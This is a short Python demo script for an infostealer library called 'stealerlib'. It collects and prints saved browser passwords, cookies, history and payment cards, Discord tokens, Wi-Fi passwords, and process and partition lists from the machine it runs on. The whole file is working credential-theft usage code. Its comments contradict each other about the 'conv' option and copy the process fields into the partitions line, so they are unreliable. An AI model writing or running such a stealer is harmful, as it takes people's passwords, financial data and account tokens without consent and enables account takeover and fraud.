#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: print_test.py
"""

from stealerlib.wifi import WiFi
from stealerlib.system import System
from stealerlib.discord import Discord
from stealerlib.browser import Browser

conv = False # default on commands is True (browser.get_passwords())
             # if True, functions will return a list of values
             # as opposed to when False, where the functions will return
             # an interactive StealerLib object

            # Example on how to iterate through an object vs. list of values

            # for site in history:
            #     url = site[0]       # if conv=False
            #     url = site.site_url # if conv=True

            # for login in passwords:
            #     password = login[3]       # if conv=False
            #     password = login.password # if conv=True

            # etc...

if __name__ == '__main__':
    system  = System()
    browser = Browser()
    network = WiFi()
    discord = Discord()

    passwords = browser.get_passwords(conv=conv)
    print(passwords, '\n') # conv=True ->  [(url, username, password), ...]
                           # conv=False -> [BrowserTypes.Login, ...]


    cookies = browser.get_cookies(conv=conv)
    print(cookies, '\n') # conv=True ->  [(host, expires?, expire_date, path, name, value), ...]
                         # conv=False -> [BrowserTypes.Cookie, ...]


    history = browser.get_history(conv=conv)
    print(history, '\n') # conv=True ->  [(site_url, title, timestamp), ...]
                         # conv=False -> [BrowserTypes.Site, ...]

    downloads = browser.get_downloads(conv=conv)
    print(downloads, '\n') # conv=True ->  [(tab_url, local_path), ...]
                           # conv=False -> [BrowserTypes.Download, ...]

    cards = browser.get_cards(conv=conv)
    print(cards, '\n') # conv=True ->  [(name, month, year, number, date_modified), ...]
                       # conv=False -> [BrowserTypes.Card, ...]

    discord.get_tokens()
    print(discord.tokens, '\n') # conv=True ->  [token1, token2, ...]
                                # conv=False -> [AppTypes.Token, ...]


    network.get_wifi_passwords()
    print(network.credentials, '\n') # conv=True ->  [(ssid, password), ...]
                                     # conv=False -> [NetTypes.WiFi, ...]


    system.get_processes(conv=conv)
    print(system.processes, '\n') # conv=True ->  [(pid, name, status, parent_process, child_processes), ...]
                                  # conv=False -> [SystemTypes.Process, ...]

    system.get_partitions(conv=conv)
    print(system.partitions, '\n')  # conv=True ->  [(pid, name, status, parent_process, child_processes), ...]
                                    # conv=False -> [SystemTypes.Partition, ...]
